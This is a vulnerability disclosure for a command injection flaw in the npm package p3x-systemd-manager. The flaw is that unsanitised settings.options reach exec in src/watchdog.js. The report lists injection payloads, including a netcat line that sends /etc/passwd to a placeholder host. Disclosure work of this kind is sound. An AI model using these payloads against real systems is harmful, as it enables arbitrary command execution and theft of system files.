# Command Injection in p3x-systemd-manager
## Basic information
Vulnerability Author: Li MuFeng(mufeng2022@hust.edu.cn)

Vulnerable npm package: p3x-systemd-manager

Npm url: https://www.npmjs.com/package/p3x-systemd-manager

Github url: https://github.com/patrikx3/systemd-manager

Vulnerable version: <= v2024.4.113

Vulnerable file: src/watchdog.js
```js
module.exports = (settings) => {
    ...
    const options = settings.options || '';
    const command = `${settings.sudo ? 'sudo ' : ''}systemctl --plain --no-pager --no-legend ${options} ${types}`;
    ...
}

```
In src/watchdog.js, line 135. The value of the input parameter 'settings.options' is not checked and directly concatenated into the constant 'command'. 

```js
exec(command, {
maxBuffer: 10 * 1024 * 1024
}, 
...
)

```
On line 39 of the same file. The constant 'command' is passed to function 'exec' in a callback function, which leads to a potential Command Injection Vulnerability.

## Payload
settings.js:
```js
{
    ...
    "options": "& touch hack.txt #"
    ...
}

// payload1: " || touch hack.txt && "
// payload2: " || nc {hostIP} {port} < /etc/passwd &&"
```
Payload1 is used to create a hack. txt file.

Payload2 is used to transfer files to remote servers.

Through carefully constructed payloads, attackers can execute any command as they want.

## Exploit
Environment: Linux, Node.js

Clone the repository and run following commands to exploit:
```
npm i
npm start
```